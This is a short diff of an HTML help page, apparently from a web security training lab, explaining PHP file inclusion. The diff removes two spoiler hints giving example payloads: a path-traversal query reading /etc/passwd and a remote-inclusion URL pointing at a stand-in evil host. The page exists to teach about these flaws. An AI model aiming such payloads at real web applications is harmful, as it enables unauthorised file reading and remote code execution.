@@ -28,8 +28,6 @@
 		<p>This allows for direct input into <u>one of many PHP functions</u> that will include the content when executing.</p>
 
 		<p>Depending on the web service configuration will depend if RFI is a possibility.</p>
-		<pre>Spoiler: <span class="spoiler">LFI: ?page=../../../../../../etc/passwd</span>.
-			Spoiler: <span class="spoiler">RFI: ?page=http://www.evilsite.com/evil.php</span>.</pre>
 
 		<br />
 	</div></td>
